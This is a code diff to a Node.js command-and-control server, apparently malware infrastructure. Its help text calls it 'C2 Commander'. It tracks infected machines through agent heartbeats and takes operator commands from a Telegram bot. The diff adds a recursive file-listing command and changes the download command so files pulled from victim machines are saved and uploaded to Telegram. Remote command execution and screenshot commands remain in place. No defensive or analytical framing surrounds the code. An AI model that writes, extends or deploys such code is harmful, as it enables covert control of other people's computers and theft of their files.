@@ -1,5 +1,7 @@
 const net = require('net');
 const https = require('https');
+const fs = require('fs');
+const path = require('path');
 const cfg = require('./config');
 const registry = require('./registry');
 const agent = require('./agent');
@@ -7,6 +9,11 @@ const agent = require('./agent');
 let tcpRelay = null;
 let httpRelay = null;
 let telegramPoller = null;
+
+const RELAY_LOG = cfg.LOG_FILE;
+function log(msg) {
+  try { fs.appendFileSync(RELAY_LOG, `[${new Date().toISOString()}] ${msg}\n`); } catch(e) {}
+}
 
 function startTCPRelay() {
   tcpRelay = net.createServer((socket) => {
@@ -26,13 +33,13 @@ function startTCPRelay() {
     socket.on('close', () => {});
     socket.on('error', () => {});
   });
-
-  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => {});
+  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => { log(`relay ready on ${cfg.RELAY_PORT}`); });
 }
 
 function handleAgentMessage(socket, msg) {
   switch (msg.type) {
     case 'heartbeat':
+      log(`hb ${msg.hostname}(${msg.id})`);
       registry.upsert(msg.id, {
         hostname: msg.hostname,
         ip: msg.ip,
@@ -43,8 +50,8 @@ function handleAgentMessage(socket, msg) {
         socket,
       });
       break;
-
     case 'cmdResult': {
+      log(`cmdResult replyId=${msg.replyId} data=${(msg.data||'').slice(0,80)}`);
       const pending = pendingReplies.get(msg.replyId);
       if (pending) {
         pending.resolve(msg.data);
@@ -52,7 +59,6 @@ function handleAgentMessage(socket, msg) {
       }
       break;
     }
-
     case 'offline':
       registry.remove(msg.id);
       break;
@@ -89,18 +95,18 @@ function sendTelegram(text) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
   });
+  req.on('error', (e) => { log(`tg send err: ${e.message}`); });
   req.write(data);
   req.end();
 }
 
 function sendFileToTelegram(filePath) {
   const Boundary = '----' + Date.now().toString(36);
-  const info = require('fs').statSync(filePath);
   const bufs = [];
   bufs.push(Buffer.from('--' + Boundary + '\r\n'));
-  bufs.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${require('path').basename(filePath)}"\r\n`));
+  bufs.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${path.basename(filePath)}"\r\n`));
   bufs.push(Buffer.from('Content-Type: application/octet-stream\r\n\r\n'));
-  bufs.push(require('fs').readFileSync(filePath));
+  bufs.push(fs.readFileSync(filePath));
   bufs.push(Buffer.from('\r\n--' + Boundary + '--\r\n'));
 
   const body = Buffer.concat(bufs);
@@ -113,6 +119,7 @@ function sendFileToTelegram(filePath) {
       'Content-Length': body.length,
     },
   });
+  req.on('error', (e) => { log(`tg file send err: ${e.message}`); });
   req.write(body);
   req.end();
 }
@@ -120,7 +127,7 @@ function sendFileToTelegram(filePath) {
 function startTelegramPoller() {
   let offset = 0;
   const poll = () => {
-    const req = https.get(`https://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=30`, (res) => {
+    const req = https.get(`https://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=20`, (res) => {
       let body = '';
       res.on('data', c => body += c);
       res.on('end', () => {
@@ -134,12 +141,14 @@ function startTelegramPoller() {
         } catch(e) {}
       });
     });
-    req.on('error', () => {});
+    req.on('error', (e) => { log(`poll err: ${e.message}`); });
+    req.setTimeout(25000, () => { req.destroy(); });
     req.end();
-    const jitter = Math.floor(Math.random() * 15000);
-    telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL + jitter);
+    log(`poll done, offset=${offset}`);
+    telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL + Math.floor(Math.random() * 10000));
   };
-  telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL);
+  log('poller starting in 10s');
+  telegramPoller = setTimeout(poll, 10000);
 }
 
 function handleTelegramUpdate(update) {
@@ -149,6 +158,7 @@ function handleTelegramUpdate(update) {
   const chatId = msg.chat.id;
   cfg.TELEGRAM_CHAT_ID = chatId;
 
+  log(`cmd: ${text}`);
   const parts = text.split(/\s+/);
   const cmd = parts[0].toLowerCase();
 
@@ -190,8 +200,23 @@ function handleTelegramUpdate(update) {
       const target = parts[1];
       const filePath = parts.slice(2).join(' ');
       if (!target || !filePath) { sendTelegram('Usage: /dl [machine] [filepath]'); break; }
-      sendCommand(target, 'dl', filePath).then(() => {
-        sendTelegram(`Download initiated for ${filePath} on ${target}`);
+      sendTelegram(`Pulling \`${filePath}\` from *${target}* ...`);
+      sendCommand(target, 'dl', filePath).then(res => {
+        try {
+          const parsed = JSON.parse(res);
+          if (parsed.data) {
+            const buf = Buffer.from(parsed.data, 'base64');
+            try { fs.mkdirSync(cfg.DOWNLOADS_DIR, { recursive: true }); } catch(e) {}
+            const outFile = path.join(cfg.DOWNLOADS_DIR, parsed.name);
+            fs.writeFileSync(outFile, buf);
+            sendFileToTelegram(outFile);
+            sendTelegram(`*${target}:* \`${filePath}\`\nSize: ${(parsed.size/1024).toFixed(1)}KB`);
+          } else {
+            sendTelegram(`*${target}:* \`${filePath}\`\n\`\`\`\n${res.slice(0, 2000)}\n\`\`\``);
+          }
+        } catch(e) {
+          sendTelegram(`*${target}:* \`${filePath}\`\n\`\`\`\n${res.slice(0, 2000)}\n\`\`\``);
+        }
       });
       break;
     }
@@ -208,10 +233,39 @@ function handleTelegramUpdate(update) {
 
     case '/tree': {
       const target = parts[1];
-      const dir = parts.slice(2).join(' ') || 'C:\\';
-      if (!target) { sendTelegram('Usage: /tree [machine] [path]'); break; }
+      const dirAndDepth = parts.slice(2).join(' ');
+      const dir = dirAndDepth || 'C:\\';
+      if (!target) { sendTelegram('Usage: /tree [machine] [path] [maxdepth]\nDefault depth: 5'); break; }
       sendCommand(target, 'tree', dir).then(res => {
-        sendTelegram(`*${target}:* \`${dir}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
+        sendTelegram(`*${target}:* \`${dir.split('|')[0]}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
+      });
+      break;
+    }
+
+    case '/listall': {
+      const target = parts[1];
+      const dirAndDepth = parts.slice(2).join(' ');
+      const dir = dirAndDepth || 'C:\\';
+      if (!target) { sendTelegram('Usage: /listall [machine] [path] [maxdepth]\nDefault depth: 10'); break; }
+      sendCommand(target, 'listall', dir).then(res => {
+        try {
+          const items = JSON.parse(res);
+          const lines = items.map(i =>
+            `${i.dir ? '[DIR]' : '[FIL]'} ${i.name}  ${(i.size/1024).toFixed(1)}KB  ${i.mtime.slice(0,10)}`
+          );
+          const chunks = [];
+          let chunk = `*${target}:* \`${dir.split('|')[0]}\` (${items.length} items)\n\`\`\`\n`;
+          for (const line of lines) {
+            if ((chunk + line).length > 3000) {
+              chunks.push(chunk + '\`\`\`');
+              chunk = `\`\`\`\n${line}\n`;
+            } else { chunk += line + '\n'; }
+          }
+          chunks.push(chunk + '\`\`\`');
+          for (const c of chunks) sendTelegram(c);
+        } catch(e) {
+          sendTelegram(`*${target}:* \`${dir.split('|')[0]}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
+        }
       });
       break;
     }
@@ -228,14 +282,15 @@ function handleTelegramUpdate(update) {
     case '/start':
     case '/help':
       sendTelegram(
-        '*C2 Control*\n\n' +
+        '*C2 Commander*\n\n' +
         '/status - Show all machines\n' +
         '/ls [machine] [path] - List directory\n' +
-        '/dl [machine] [filepath] - Download file\n' +
+        '/listall [machine] [path] [depth] - Full recursive listing\n' +
+        '/tree [machine] [path] [depth] - Directory tree\n' +
+        '/dl [machine] [filepath] - Pull file to Telegram\n' +
         '/exec [machine] [command] - Run command\n' +
-        '/tree [machine] [path] - Directory tree\n' +
         '/screenshot [machine] - Take screenshot\n\n' +
-        'File explorer: `http://[IP]:8080` or `\\\\\\\\[IP]\\\\C$`'
+        `File server: \`http://[IP]:${cfg.FS_PORT}\``
       );
       break;
   }
